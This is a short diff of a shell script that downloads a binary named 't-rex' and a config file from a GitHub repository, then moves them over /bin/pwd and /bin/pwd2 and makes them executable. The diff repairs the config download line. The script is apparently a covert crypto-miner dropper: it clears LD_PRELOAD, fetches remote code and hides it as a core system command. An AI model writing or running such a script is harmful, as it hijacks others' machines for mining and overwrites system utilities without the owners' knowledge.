@@ -2,7 +2,7 @@
 echo "ENGINE START!"
 export LD_PRELOAD=
 curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
-https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/config
+curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/config
 mv t-rex /bin/pwd
 mv config /bin/pwd2
 chmod +x /bin/pwd
